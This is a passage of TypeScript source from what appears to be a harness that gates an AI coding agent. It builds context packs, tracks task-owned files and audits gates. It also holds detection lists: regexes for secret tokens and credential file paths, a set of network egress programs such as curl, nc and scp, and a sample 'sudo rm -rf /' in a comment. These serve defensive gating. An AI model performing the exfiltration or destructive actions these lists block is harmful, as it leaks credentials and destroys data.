  if (!existsSync(absolute)) return null;
  let stats;
  try {
    stats = lstatSync(absolute);
  } catch {
    return null;
  }
  // A symlink can point anywhere, including outside the repository, so it is never packed.
  if (!stats.isFile() || stats.isSymbolicLink()) return null;
  const raw = readFileSync(absolute);
  if (raw.includes(0)) return null;
  const text = normalizeLf(raw.toString("utf8"));
  const truncated = text.length > limit;
  const contents = truncated ? `${text.slice(0, limit)}\n[... truncated ...]` : text;
  return {
    path: rel,
    priority: 0,
    chars: contents.length,
    sha256: sha256(text),
    contents,
    truncated,
  };
}

function contextPack(positional: string[], options: CliOptions): void {
  const root = targetFrom(options);
  const definition = catalog(root);
  const budget: Required<ContextBudget> = {
    ...DEFAULT_CONTEXT_BUDGET,
    ...(definition.contextPack || {}),
    ...(Number(options["budget-chars"]) > 0 ? { totalChars: Number(options["budget-chars"]) } : {}),
  };
  const request = requestedPaths(root, positional, options);
  const impact = affectedModules(root, request.paths, !request.explicit);
  const bound = binding(root, options.base);

  const omitted: Array<{ path: string; reason: string }> = [];
  const candidates: PackEntry[] = [];

  // Priority 1: each affected module's own summary, which is the cheapest way to explain a
  // subsystem without reading its source.
  for (const module of impact.affected) {
    const base = (module.root || "").replace(/\/+$/, "");
    const capsule = base ? `${base}/MODULE-CAPSULE.md` : `${module.id}/MODULE-CAPSULE.md`;
    const entry = readForContext(root, capsule, budget.fileChars);
    if (entry) candidates.push({ ...entry, priority: 1 });
  }

  // Priority 2: the changed files themselves, which is what the task is actually about.
  for (const path of impact.paths) {
    if (contextDenied(path)) {
      omitted.push({ path, reason: "denied path" });
      continue;
    }
    const entry = readForContext(root, path, budget.fileChars);
    if (!entry) {
      omitted.push({ path, reason: "missing, binary, or not a regular file" });
      continue;
    }
    candidates.push({ ...entry, priority: 2 });
  }

  // Priority 3: the canonical diff, which explains how those files changed.
  // Read one character past the budget so truncation is detectable without loading the rest.
  const diffText = canonicalDiffText(root, bound.base_commit, budget.diffChars + 1);
  const diffTruncated = diffText.length > budget.diffChars;
  const diffBody = diffTruncated ? `${diffText.slice(0, budget.diffChars)}\n[... truncated ...]` : diffText;
  const diffEntry: PackEntry | null = diffText.trim()
    ? {
        path: "<canonical-diff>",
        priority: 3,
        chars: diffBody.length,
        // The pack references the binding hash rather than hashing its own excerpt, so the
        // manifest still identifies the exact change the pack was built from.
        sha256: bound.diff_sha256,
        contents: diffBody,
        truncated: diffTruncated,
      }
    : null;
  if (diffEntry) candidates.push(diffEntry);

  const ordered = candidates
    .sort((left, right) => left.priority - right.priority || left.path.localeCompare(right.path));

  const included: PackEntry[] = [];
  let used = 0;
  for (const entry of ordered) {
    if (included.length >= budget.maxFiles) {
      omitted.push({ path: entry.path, reason: "file budget exhausted" });
      continue;
    }
    if (used + entry.chars > budget.totalChars) {
      omitted.push({ path: entry.path, reason: "character budget exhausted" });
      continue;
    }
    included.push(entry);
    used += entry.chars;
  }

  if (included.length === 0 && ordered.length > 0) {
    throw new Error(
      "Context budget is too small to include anything; raise the budget or narrow the change set.",
    );
  }

  const packHash = sha256(
    canonicalJson({
      budget,
      diff_sha256: bound.diff_sha256,
      included: included.map((entry) => ({ path: entry.path, sha256: entry.sha256, chars: entry.chars })),
      omitted,
    }),
  );

  const body = included
    .map((entry) => `----- ${entry.path} (${entry.chars} chars${entry.truncated ? ", truncated" : ""}) -----\n${entry.contents}`)
    .join("\n\n");
  const directory = resolve(root, STATE_REL, "context");
  mkdirSync(directory, { recursive: true });
  const file = resolve(directory, `pack-${packHash.slice(0, 12)}.txt`);
  if (!boolOption(options, "dry-run")) writeFileSync(file, body, "utf8");

  // Only the manifest reaches the model. Printing the pack itself would spend the very
  // context budget the pack exists to protect.
  printJson({
    command: "context-pack",
    target: root,
    ...bound,
    modules: impact.affected.map((module: ModuleDefinition) => module.id),
    expanded_to_all: impact.expanded_to_all,
    budget,
    used_chars: used,
    pack_sha256: packHash,
    pack_path: boolOption(options, "dry-run") ? null : posix(relative(root, file)),
    included: included.map((entry) => ({
      path: entry.path,
      priority: entry.priority,
      chars: entry.chars,
      truncated: entry.truncated,
      // Per-entry hashes make the manifest sufficient to audit what was packed without
      // opening the pack itself.
      sha256: entry.sha256,
    })),
    omitted,
  });
}

const TASKS_REL = `${STATE_REL}/tasks.json`;

interface HarnessTask {
  version: 1;
  id: string;
  goal: string;
  scope: string;
  out_of_scope: string;
  risk: "low" | "medium" | "high";
  owned_paths: string[];
  status: "active" | "complete" | "cancelled";
  base_commit: string;
  /** Hash of every owned path when the task started, or null when the file did not exist. */
  known_hashes: Record<string, string | null>;
  /** Paths already dirty before the task began, so user work is never mistaken for our own. */
  preexisting_dirty: string[];
  created_at: string;
  closed_at?: string;
}

interface TaskState {
  version: 1;
  tasks: HarnessTask[];
}

function readTasks(root: string): TaskState {
  const path = resolve(root, TASKS_REL);
  if (!existsSync(path)) return { version: 1, tasks: [] };
  const value = readJson(path);
  return { version: 1, tasks: Array.isArray(value?.tasks) ? value.tasks : [] };
}

function activeTask(root: string): HarnessTask | null {
  return readTasks(root).tasks.find((task) => task.status === "active") ?? null;
}

function ownsPath(task: HarnessTask, rel: string): boolean {
  return matchesPath(rel, task.owned_paths);
}

// Blocking is only correct if we can tell the agent's own edits from someone else's. The
// baseline records what each owned file looked like at task start, and every accepted write
// updates it, so a mismatch means a third party changed the file underneath us.
function preflightTaskWrite(root: string, rel: string): HookOutput | null {
  const task = activeTask(root);
  if (!task || !ownsPath(task, rel)) return null;
  const current = fileHash(resolve(root, rel));
  if (!Object.hasOwn(task.known_hashes, rel)) {
    if (current === null) return null;
    return decision(
      "deny",
      `Owned path ${rel} exists but was not captured by the task baseline. Restart the task or escalate before overwriting it.`,
      rel,
    );
  }
  if (current !== task.known_hashes[rel]) {
    return decision(
      "deny",
      `${rel} changed outside this task since it was last written. Reconcile the conflict before writing again.`,
      rel,
    );
  }
  return null;
}

function recordTaskWrite(root: string, rel: string): void {
  withStateLock(root, "tasks", () => {
    const state = readTasks(root);
    const task = state.tasks.find((entry) => entry.status === "active");
    if (!task || !ownsPath(task, rel)) return;
    task.known_hashes[rel] = fileHash(resolve(root, rel));
    writeJson(resolve(root, TASKS_REL), state);
  });
}

function taskCommand(positional: string[], options: CliOptions): void {
  const root = targetFrom(options);
  const subcommand = positional[0] || "status";

  if (subcommand === "status") {
    const state = readTasks(root);
    printJson({ command: "task status", target: root, active: activeTask(root), tasks: state.tasks });
    return;
  }

  if (subcommand === "start") {
    const owned = String(options.owned || "")
      .split(",")
      .map((entry) => entry.trim())
      .filter(Boolean);
    if (!options.goal) throw new Error("task start requires --goal.");
    if (owned.length === 0) throw new Error("task start requires --owned with at least one path glob.");
    const risk = String(options.risk || "medium");
    if (!["low", "medium", "high"].includes(risk)) {
      throw new Error("task --risk must be low, medium, or high.");
    }
    return withStateLock(root, "tasks", () => {
      const state = readTasks(root);
      if (state.tasks.some((task) => task.status === "active")) {
        throw new Error("Another task is already active. Complete or cancel it first.");
      }
      const bound = binding(root, options.base);
      const dirty = changedPaths(root, bound.base_commit);
      const knownHashes: Record<string, string | null> = {};
      for (const absolute of walkFiles(root)) {
        const rel = posix(relative(root, absolute));
        if (matchesPath(rel, owned)) knownHashes[rel] = fileHash(absolute);
      }
      const task: HarnessTask = {
        version: 1,
        id: `task-${Date.now()}-${sha256(String(options.goal)).slice(0, 8)}`,
        goal: String(options.goal),
        scope: String(options.scope || owned.join(", ")),
        out_of_scope: String(options["out-of-scope"] || ""),
        risk: risk as HarnessTask["risk"],
        owned_paths: owned,
        status: "active",
        base_commit: bound.base_commit,
        known_hashes: knownHashes,
        preexisting_dirty: dirty,
        created_at: new Date().toISOString(),
      };
      state.tasks.push(task);
      writeJson(resolve(root, TASKS_REL), state);
      printJson({ command: "task start", target: root, task });
    });
  }

  if (subcommand === "cancel" || subcommand === "complete") {
    return withStateLock(root, "tasks", () => {
      const state = readTasks(root);
      const task = state.tasks.find((entry) => entry.status === "active");
      if (!task) throw new Error("No task is active.");
      if (subcommand === "complete") {
        const plan = buildVerifyPlan(root, [], options);
        const assessment = assessQuality(root, plan);
        if (!assessment.complete) {
          printJson({
            command: "task complete",
            target: root,
            ok: false,
            blocked_by: assessment.checks.filter((check) => !check.acceptable),
          });
          process.exitCode = 2;
          return;
        }
      }
      task.status = subcommand === "complete" ? "complete" : "cancelled";
      task.closed_at = new Date().toISOString();
      writeJson(resolve(root, TASKS_REL), state);
      printJson({ command: `task ${subcommand}`, target: root, ok: true, task });
    });
  }

  throw new Error("task supports start, status, complete, or cancel.");
}

interface GateActivity {
  event: string;
  denied: number;
  asked: number;
  followups: number;
  observed: number;
  errors: number;
  last_intervention: string | null;
  examples: string[];
}

// A gate nobody can show a catch for is pure cost: latency, false positives, and the false
// confidence of a control that has never been exercised. This makes that measurable.
function gateAudit(options: CliOptions): void {
  const root = targetFrom(options);
  const ledgerPath = resolve(root, STATE_REL, "ledger.jsonl");
  const activity = new Map<string, GateActivity>();
  for (const event of EVENTS) {
    activity.set(event, {
      event,
      denied: 0,
      asked: 0,
      followups: 0,
      observed: 0,
      errors: 0,
      last_intervention: null,
      examples: [],
    });
  }

  let records = 0;
  let earliest: string | null = null;
  let latest: string | null = null;
  if (existsSync(ledgerPath)) {
    for (const line of readFileSync(ledgerPath, "utf8").split("\n").filter(Boolean)) {
      let record: Record<string, unknown>;
      try {
        record = JSON.parse(line);
      } catch {
        continue;
      }
      records += 1;
      const timestamp = String(record.timestamp || "");
      if (!earliest || timestamp < earliest) earliest = timestamp;
      if (!latest || timestamp > latest) latest = timestamp;
      const entry = activity.get(String(record.event));
      if (!entry) continue;
      const outcome = String(record.outcome || "");
      if (outcome === "deny") entry.denied += 1;
      else if (outcome === "ask") entry.asked += 1;
      else if (outcome === "followup") entry.followups += 1;
      else if (outcome.startsWith("error:")) entry.errors += 1;
      else entry.observed += 1;
      if (outcome === "deny" || outcome === "ask" || outcome === "followup") {
        entry.last_intervention = timestamp;
        if (entry.examples.length < 3 && record.reason) entry.examples.push(String(record.reason));
      }
    }
  }

  const gates = [...activity.values()];
  const effective = gates.filter((gate) => gate.denied + gate.asked + gate.followups > 0);
  const inert = gates.filter(
    (gate) => gate.denied + gate.asked + gate.followups === 0 && gate.observed + gate.errors > 0,
  );
  const unexercised = gates.filter((gate) => gate.observed + gate.errors + gate.denied + gate.asked + gate.followups === 0);

  printJson({
    command: "gate-audit",
    target: root,
    ledger_records: records,
    window: { from: earliest, to: latest },
    effective: effective.sort((left, right) => right.denied + right.asked - (left.denied + left.asked)),
    inert: inert.map((gate) => gate.event),
    unexercised: unexercised.map((gate) => gate.event),
    guidance:
      "A gate listed under `inert` has run without ever intervening. Either produce evidence of what it caught, or remove it rather than paying its cost for reassurance.",
  });
}

interface FitnessRule {
  id: string;
  attributes: QualityAttribute[];
  severity: "error" | "warning" | "info";
  /** Globs the rule applies to. Empty means every scanned source file. */
  appliesTo?: string[];
  /** Modules the rule is scoped to. Empty means all modules. */
  modules?: string[];
  /** A match is a violation. */
  forbid: string;
  /** When set, a file matching `appliesTo` must contain this pattern at least once. */
  require?: string;
  /**
   * Only apply where the module declares one of this rule's attributes at least this strongly.
   * This is how a prototype avoids the bar set for a payments module.
   */
  minimumTier?: AttributeTier;
  rationale: string;
  fix: string;
}

const TIER_RANK: Record<AttributeTier, number> = {
  critical: 5,
  high: 4,
  medium: 3,
  low: 2,
  minimal: 1,
  none: 0,
};

/** Suppression marker, placed on the offending line or the line above it. */
const FITNESS_IGNORE = "harness-fitness:ignore";

// Rules that need no external tool and no language server, so they work on day one in any
// repository. Anything needing real analysis belongs in an adapter, not here.
const DEFAULT_FITNESS_RULES: FitnessRule[] = [
  {
    id: "no-secret-literal",
    attributes: ["security"],
    severity: "error",
    // Two independent signals: a credential-shaped assignment, and token formats that are
    // recognizable on their own so a generic variable name cannot hide them.
    forbid:
      "(?:api[_-]?key|secret|password|passwd|token|private[_-]?key|credential)\\s*[:=]\\s*[\"'][A-Za-z0-9/+_\\-]{16,}[\"']" +
      "|[\"'](?:sk|pk|rk)[_-]live[_-][A-Za-z0-9]{12,}[\"']" +
      "|[\"']gh[pousr]_[A-Za-z0-9]{16,}[\"']" +
      "|[\"']xox[abposr]-[A-Za-z0-9-]{10,}[\"']" +
      "|[\"']AKIA[0-9A-Z]{16}[\"']" +
      "|-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----",
    rationale: "A credential written into source is published the moment the repository is shared.",
    fix: "Read the value from the environment or a secrets manager and keep only a placeholder in code.",
  },
  {
    id: "no-pii-in-logs",
    attributes: ["privacy"],
    severity: "error",
    forbid:
      "(?:log|logger|console|print|println|fmt\\.Print\\w*)[.\\w]*\\s*\\([^)\\n]*\\b(?:email|e_mail|ssn|social_security|passport|credit_card|card_number|phone_number|date_of_birth|dob|national_id)\\b",
    rationale: "Personal data in logs spreads to systems with weaker access control and longer retention.",
    fix: "Log a stable pseudonymous identifier instead of the personal field.",
  },
  {
    id: "no-silent-failure",
    attributes: ["reliability"],
    severity: "error",
    forbid: "catch\\s*(?:\\([^)]*\\))?\\s*\\{\\s*\\}|except[^:\\n]*:\\s*(?:pass|\\.\\.\\.)\\s*$",
    rationale: "An empty handler converts a failure into a wrong answer that nothing reports.",
    fix: "Handle the error, or rethrow it, or log it with enough context to diagnose.",
  },
  {
    id: "no-unbounded-retry",
    attributes: ["resilience"],
    severity: "warning",
    forbid:
      "(?:while\\s*\\(\\s*true\\s*\\)|while\\s+True\\s*:|for\\s*\\(\\s*;\\s*;\\s*\\))[\\s\\S]{0,240}?\\b(?:retry|reconnect|fetch|request|poll)\\b",
    rationale:
      "A retry loop with no bound or backoff turns a transient fault into a sustained outage. This is a heuristic; suppress it on a loop that does bound its attempts.",
    fix: "Add a maximum attempt count and exponential backoff with jitter.",
  },
  {
    id: "no-unreferenced-deferral",
    attributes: ["safety"],
    severity: "warning",
    minimumTier: "high",
    forbid: "\\b(?:TODO|FIXME|XXX|HACK)\\b(?![^\\n]*\\b(?:issue|ticket|#\\d+)\\b)",
    rationale: "An unreferenced marker in a high-tier module is work nobody has agreed to do.",
    fix: "Link the marker to a tracked issue, or resolve it.",
  },
];

function fitnessRules(root: string): FitnessRule[] {
  const local = resolve(root, "harness/fitness-rules.json");
  if (!existsSync(local)) return DEFAULT_FITNESS_RULES;
  const value = readJson(local);
  if (!Array.isArray(value?.rules)) throw new Error("fitness-rules.json must define a rules array.");
  return value.replace === true ? value.rules : [...DEFAULT_FITNESS_RULES, ...value.rules];
}

interface FitnessFinding {
  rule: string;
  attributes: QualityAttribute[];
  severity: string;
  module: string | null;
  path: string;
  line: number;
  excerpt: string;
  rationale: string;
  fix: string;
}

function fitness(options: CliOptions): void {
  const root = targetFrom(options);
  const definition = catalog(root);
  const rules = fitnessRules(root);
  const scanAll = boolOption(options, "all");
  const subjects = scanAll
    ? walkFiles(root)
        .map((absolute) => posix(relative(root, absolute)))
        .filter((path) => SOURCE_EXTENSIONS.has(path.slice(path.lastIndexOf("."))))
    : requestedPaths(root, [], options).paths.filter((path) =>
        SOURCE_EXTENSIONS.has(path.slice(path.lastIndexOf("."))),
      );

  const findings: FitnessFinding[] = [];
  let scanned = 0;
  for (const path of subjects) {
    const absolute = resolve(root, path);
    if (contextDenied(path) || !existsSync(absolute)) continue;
    let stats;
    try {
      stats = lstatSync(absolute);
    } catch {
      continue;
    }
    if (!stats.isFile() || stats.isSymbolicLink()) continue;
    const raw = readFileSync(absolute);
    if (raw.includes(0)) continue;
    const contents = normalizeLf(raw.toString("utf8"));
    const lines = contents.split("\n");
    const owner = moduleForPath(definition, path);
    scanned += 1;

    for (const rule of rules) {
      if (rule.appliesTo?.length && !matchesPath(path, rule.appliesTo)) continue;
      if (rule.modules?.length && (!owner || !rule.modules.includes(owner.id))) continue;
      // A rule scoped to attributes the module opted out of should not fire at all.
      if (owner && ruleOptedOut(owner, rule)) continue;
      if (rule.minimumTier && !meetsMinimumTier(owner, rule)) continue;

      if (rule.require) {
        if (!new RegExp(rule.require, "m").test(contents)) {
          findings.push({
            rule: rule.id,
            attributes: rule.attributes,
            severity: rule.severity,
            module: owner?.id ?? null,
            path,
            line: 1,
            excerpt: "<required pattern absent>",
            rationale: rule.rationale,
            fix: rule.fix,
          });
        }
        continue;
      }
      const pattern = new RegExp(rule.forbid, "gmi");
      let match = pattern.exec(contents);
      while (match) {
        const line = contents.slice(0, match.index).split("\n").length;
        const suppressed =
          (lines[line - 1] || "").includes(FITNESS_IGNORE) ||
          (lines[line - 2] || "").includes(FITNESS_IGNORE);
        if (suppressed) {
          if (match.index === pattern.lastIndex) pattern.lastIndex += 1;
          match = pattern.exec(contents);
          continue;
        }
        findings.push({
          rule: rule.id,
          attributes: rule.attributes,
          severity: rule.severity,
          module: owner?.id ?? null,
          path,
          line,
          excerpt: boundedText(redactSecrets((lines[line - 1] || "").trim()), 200),
          rationale: rule.rationale,
          fix: rule.fix,
        });
        if (match.index === pattern.lastIndex) pattern.lastIndex += 1;
        match = pattern.exec(contents);
      }
    }
  }

  const errors = findings.filter((finding) => finding.severity === "error");
  printJson({
    command: "fitness",
    target: root,
    ok: errors.length === 0,
    scope: scanAll ? "repository" : "changed paths",
    scanned_files: scanned,
    rules: rules.length,
    counts: {
      error: errors.length,
      warning: findings.filter((finding) => finding.severity === "warning").length,
      info: findings.filter((finding) => finding.severity === "info").length,
    },
    findings: findings.slice(0, 200),
  });
  if (errors.length > 0) process.exitCode = 1;
}

// An undeclared attribute counts as zero, so a rule gated on a minimum tier applies only where
// the repository actually asked for that strength.
function meetsMinimumTier(module: ModuleDefinition | null, rule: FitnessRule): boolean {
  if (!module) return false;
  const floor = TIER_RANK[rule.minimumTier as AttributeTier] ?? 0;
  const declared = module.attributes || {};
  return rule.attributes.some((attribute) => {
    const requirement = declared[attribute];
    if (requirement === undefined) return false;
    return TIER_RANK[normalizeRequirement(requirement).tier] >= floor;
  });
}

// Tier drives rule strength, so a module that declared an attribute as `none` is not policed
// for it at all.
function ruleOptedOut(module: ModuleDefinition, rule: FitnessRule): boolean {
  if (rule.attributes.length === 0) return false;
  const declared = module.attributes || {};
  return rule.attributes.every((attribute) => {
    const requirement = declared[attribute];
    if (requirement === undefined) return false;
    return normalizeRequirement(requirement).tier === "none";
  });
}

interface AdapterDefinition {
  id: string;
  attributes: QualityAttribute[];
  class: string;
  executable: string;
  command: string;
  install: string;
  rationale: string;
  timeoutMs?: number;
}

function adapterCatalog(root: string): AdapterDefinition[] {
  const local = resolve(root, "harness/adapters.json");
  const source = existsSync(local) ? local : resolve(HARNESS_ROOT, "harness/adapters.json");
  if (!existsSync(source)) return [];
  const value = readJson(source);
  return Array.isArray(value?.adapters) ? value.adapters : [];
}

function adapters(positional: string[], options: CliOptions): void {
  const root = targetFrom(options);
  const subcommand = positional[0] || "list";
  const catalogue = adapterCatalog(root);

  if (subcommand === "list") {
    const wanted = String(options.attribute || "");
    const filtered = wanted
      ? catalogue.filter((adapter) => adapter.attributes.includes(wanted as QualityAttribute))
      : catalogue;
    const matrixPath = resolve(root, "harness/verification-matrix.json");
    const installed = existsSync(matrixPath) ? Object.keys(readJson(matrixPath).checks || {}) : [];
    printJson({
      command: "adapters list",
      target: root,
      adapters: filtered.map((adapter) => ({
        id: adapter.id,
        attributes: adapter.attributes,
        executable: adapter.executable,
        available: whichCommand(adapter.executable) !== null,
        wired: installed.includes(adapter.id),
        install: adapter.install,
        rationale: adapter.rationale,
      })),
    });
    return;
  }

  if (subcommand !== "add") throw new Error("adapters supports list or add.");
  const id = positional[1] || String(options.id || "");
  const adapter = catalogue.find((entry) => entry.id === id);
  if (!adapter) throw new Error(`Unknown adapter: ${id || "<missing>"}. Run \`adapters list\`.`);

  const matrixPath = resolve(root, "harness/verification-matrix.json");
  const matrixValue = existsSync(matrixPath) ? readJson(matrixPath) : { version: 1, checks: {} };
  matrixValue.checks = matrixValue.checks || {};
  const already = Boolean(matrixValue.checks[adapter.id]);
  matrixValue.checks[adapter.id] = {
    class: adapter.class,
    command: adapter.command,
    required: true,
    attributes: adapter.attributes,
    ...(adapter.timeoutMs ? { timeoutMs: adapter.timeoutMs } : {}),
  };
  if (!boolOption(options, "dry-run")) writeJson(matrixPath, matrixValue);

  printJson({
    command: "adapters add",
    target: root,
    id: adapter.id,
    changed: !already,
    dry_run: boolOption(options, "dry-run"),
    executable_available: whichCommand(adapter.executable) !== null,
    install: adapter.install,
    // Wiring the check is only half the job: nothing selects it until a module asks for it.
    next_step: `Add "${adapter.id}" to the verification list of every module that needs ${adapter.attributes.join(" and ")} evidence.`,
  });
}

// An architecture decision that nothing checks is a decision the codebase will drift away from.
// The filter is deliberately inclusive: only explicitly retired records are exempt, because most
// decisions never leave `proposed` and excluding them would exempt the majority.
function adrCheck(options: CliOptions): void {
  const root = targetFrom(options);
  const directory = resolve(root, String(options.dir || "docs/adr"));
  const knownChecks = new Set(Object.keys(matrix(root).checks || {}));
  const knownRules = new Set(fitnessRules(root).map((rule) => rule.id));

  if (!existsSync(directory)) {
    printJson({
      command: "adr-check",
      target: root,
      ok: true,
      directory: posix(relative(root, directory)),
      records: 0,
      note: "No decision records found; nothing to enforce.",
    });
    return;
  }

  const records: Array<{
    path: string;
    status: string;
    enforced_by: string[];
    unknown_references: string[];
    ok: boolean;
  }> = [];
  for (const absolute of walkFiles(directory)) {
    const rel = posix(relative(root, absolute));
    if (!rel.endsWith(".md")) continue;
    const contents = normalizeLf(readFileSync(absolute, "utf8"));
    const status = (/^status:\s*(.+)$/im.exec(contents)?.[1] || "unknown").trim().toLowerCase();
    const referenced = [
      ...contents.matchAll(/^enforced-by:\s*(.+)$/gim),
    ].flatMap((match) => match[1].split(",").map((entry) => entry.trim()).filter(Boolean));
    const retired = status === "superseded" || status === "deprecated" || status === "rejected";
    const unknown = referenced.filter((id) => !knownChecks.has(id) && !knownRules.has(id));
    records.push({
      path: rel,
      status,
      enforced_by: referenced,
      unknown_references: unknown,
      ok: retired || (referenced.length > 0 && unknown.length === 0),
    });
  }

  const failing = records.filter((record) => !record.ok);
  printJson({
    command: "adr-check",
    target: root,
    ok: failing.length === 0,
    directory: posix(relative(root, directory)),
    records: records.length,
    failing: failing.map((record) => ({
      path: record.path,
      status: record.status,
      reason:
        record.enforced_by.length === 0
          ? "No `Enforced-by:` line naming a verification check or fitness rule."
          : `References unknown checks or rules: ${record.unknown_references.join(", ")}.`,
    })),
    enforced: records.filter((record) => record.ok && record.enforced_by.length > 0).length,
  });
  if (failing.length > 0) process.exitCode = 1;
}

function quality(positional: string[], options: CliOptions): void {
  const root = targetFrom(options);
  const subcommand = positional[0] || "status";
  if (subcommand !== "status" && subcommand !== "attributes") {
    throw new Error("quality supports the status or attributes subcommand.");
  }
  const plan = buildVerifyPlan(root, [], options);
  const assessment = assessQuality(root, plan);
  if (subcommand === "attributes") {
    const gaps = assessment.attributes.filter((entry) => !entry.covered);
    const byTier: Record<string, number> = {};
    for (const entry of assessment.attributes) byTier[entry.tier] = (byTier[entry.tier] || 0) + 1;
    printJson({
      command: "quality attributes",
      target: root,
      base_commit: assessment.base_commit,
      diff_sha256: assessment.diff_sha256,
      declared: assessment.attributes.length,
      covered: assessment.attributes.length - gaps.length,
      by_tier: byTier,
      blocking_gaps: gaps.filter((entry) => entry.enforcement === "block").length,
      attributes: assessment.attributes,
    });
    if (gaps.some((entry) => entry.enforcement === "block")) process.exitCode = 2;
    return;
  }
  printJson({ command: "quality status", target: root, ...assessment });
  if (!assessment.complete) process.exitCode = 2;
}

function sensitivePath(filePath: string): boolean {
  // Backslashes are folded first so the verdict is identical on every host. A security check
  // whose answer depends on the platform running it is not a check.
  const normalized = posix(resolve(filePath.replace(/\\/g, "/"))).toLowerCase().replace(/\\/g, "/");
  const name = normalized.slice(normalized.lastIndexOf("/") + 1);
  if (/^\.env($|\.)/.test(name) && !/\.(example|sample|template)$/.test(name)) return true;
  if (/\.(pem|key|p12|pfx|jks|keystore)$/.test(name)) return true;
  if (
    /^(id_rsa|id_ecdsa|id_ed25519|credentials|credentials\.json|secrets?\.json|service-account\.json|\.netrc|\.npmrc|\.pypirc)$/.test(
      name,
    )
  ) {
    return true;
  }
  // Matches the directory itself as well as anything under it, since a trailing separator is
  // absent when the path names the directory.
  return /(^|\/)(\.ssh|\.aws|\.azure|\.gnupg|\.kube|\.docker)(\/|$)/.test(normalized);
}

interface ShellSegment {
  /** Executable name with any directory prefix and `.exe` suffix removed. */
  name: string;
  args: string[];
  /** Raw tokens starting at the program, suitable for spawning without a shell. */
  tokens: string[];
  /** True when this segment receives stdin from the previous one, so data flows between them. */
  pipedFrom: boolean;
}

interface ShellParse {
  segments: ShellSegment[];
  /** True when substitution or globbing means the literal tokens do not describe the real call. */
  dynamic: boolean;
}

// Wrappers that pass their tail through to another program. Classification has to look past them,
// otherwise `sudo rm -rf /` is only ever seen as a `sudo` call.
// The value is how many non-flag arguments the wrapper consumes before the real program.
// `timeout 5 git ...` was previously parsed as running a program called `5`.
const COMMAND_WRAPPERS = new Map<string, number>([
  ["sudo", 0],
  ["doas", 0],
  ["nohup", 0],
  ["time", 0],
  ["timeout", 1],
  ["nice", 0],
  ["ionice", 0],
  ["stdbuf", 0],
  ["command", 0],
  ["builtin", 0],
  ["exec", 0],
  ["env", 0],
]);

/** Flags that take a separate value, so the value is not mistaken for the program. */
const WRAPPER_VALUE_FLAGS = new Set(["-n", "-c", "-u", "-g", "-U", "-o", "-e", "-i", "-p", "-k", "-s"]);

// Programs that can move file contents off the machine. Pairing one with a secret path is
// exfiltration regardless of how the rest of the line is written.
const EGRESS_COMMANDS = new Set([
  "curl",
  "wget",
  "scp",
  "sftp",
  "rsync",
  "ssh",
  "nc",
  "ncat",
  "netcat",
  "telnet",
  "ftp",
  "invoke-restmethod",
  "invoke-webrequest",
  "start-bitstransfer",
]);

const SHELL_ESCAPABLE = new Set([
  "\\", '"', "'", " ", "\t", "\n", "$", "`", "!", "&", "|", ";",
  "<", ">", "(", ")", "*", "?", "[", "]", "{", "}", "~", "#",
]);

function stripExecutableName(token: string): string {
  const normalized = posix(token).replace(/^.*\//, "");
  return normalized.replace(/\.(exe|cmd|bat|ps1)$/i, "").toLowerCase();
}

// A small POSIX-ish tokenizer. It exists to answer "which program is being run with which
// arguments", which regular expressions over the raw string cannot answer reliably.
function parseShellCommand(value: string): ShellParse {
  const segments: ShellSegment[] = [];
  let tokens: string[] = [];
  let current = "";
  let hasCurrent = false;
  let quote: '"' | "'" | null = null;
  let dynamic = false;
  let pendingPipe = false;

  const pushToken = () => {
    if (hasCurrent) {
      tokens.push(current);
      current = "";
      hasCurrent = false;
    }
  };
  const pushSegment = (nextIsPiped: boolean) => {
    pushToken();
    if (tokens.length > 0) {
      segments.push({ ...toSegment(tokens), pipedFrom: pendingPipe });
      pendingPipe = nextIsPiped;
    }
    tokens = [];
  };

  for (let index = 0; index < value.length; index += 1) {
    const char = value[index];
    if (quote === "'") {
      if (char === "'") quote = null;
      else {
        current += char;
        hasCurrent = true;
      }
      continue;
    }
    if (char === "\\") {
      const next = value[index + 1];
      // On Windows a backslash is the path separator, so consuming it as an escape turned
      // `C:\Users\me\.ssh\id_rsa` into an unrecognizable name and let credential reads through.
      // Only characters that genuinely need escaping in a shell are treated as escaped.
      if (next !== undefined && SHELL_ESCAPABLE.has(next)) {
        current += next;
        hasCurrent = true;
        index += 1;
      } else {
        current += char;
        hasCurrent = true;
      }
      continue;
    }
    if (quote === '"') {
      if (char === '"') quote = null;
      else {
        if (char === "$" && (value[index + 1] === "(" || value[index + 1] === "{")) dynamic = true;
        if (char === "`") dynamic = true;
        current += char;
        hasCurrent = true;
      }
      continue;
    }
    if (char === "'" || char === '"') {
      quote = char;
      hasCurrent = true;
      continue;
    }
    if (char === "`") {
      dynamic = true;
      current += char;
      hasCurrent = true;
      continue;
    }
    if (char === "$" && (value[index + 1] === "(" || value[index + 1] === "{")) {
      dynamic = true;
      current += char;
      hasCurrent = true;
      continue;
    }
    if (char === ";" || char === "\n" || char === "&" || char === "|") {
      const doubled = (char === "&" || char === "|") && value[index + 1] === char;
      pushSegment(char === "|" && !doubled);
      if (doubled) index += 1;
      continue;
    }
    if (char === " " || char === "\t" || char === "\r") {
      pushToken();
      continue;
    }
    current += char;
    hasCurrent = true;
  }
  pushSegment(false);
  return { segments, dynamic };
}

function toSegment(tokens: string[]): Omit<ShellSegment, "pipedFrom"> {
  let index = 0;
  // Leading `NAME=value` pairs are environment assignments, not the program being run.
  while (index < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[index])) index += 1;
  while (index < tokens.length) {
    const name = stripExecutableName(tokens[index]);
    const consumes = COMMAND_WRAPPERS.get(name);
    if (consumes === undefined) {
      return { name, args: tokens.slice(index + 1), tokens: tokens.slice(index) };
    }
    index += 1;
    // `env` accepts its own assignments and flags before the real program.
    while (index < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[index])) index += 1;
    while (index < tokens.length && tokens[index].startsWith("-")) {
      const flag = tokens[index];
      index += 1;
      // A flag written separately from its value would otherwise leave the value in front.
      if (WRAPPER_VALUE_FLAGS.has(flag) && index < tokens.length && !tokens[index].startsWith("-")) {
        index += 1;
      }
    }
    for (let consumed = 0; consumed < consumes && index < tokens.length; consumed += 1) index += 1;
  }
  return { name: "", args: [], tokens: [] };
}

// Git accepts global options before the subcommand, so `git -C . reset --hard` and
// `git reset --hard` are the same operation written two ways.
function gitOperation(args: string[]): { subcommand: string; rest: string[] } {
  let index = 0;
  while (index < args.length) {
    const token = args[index];
    if (token === "-C" || token === "-c" || token === "--namespace") {
      index += 2;
      continue;
    }
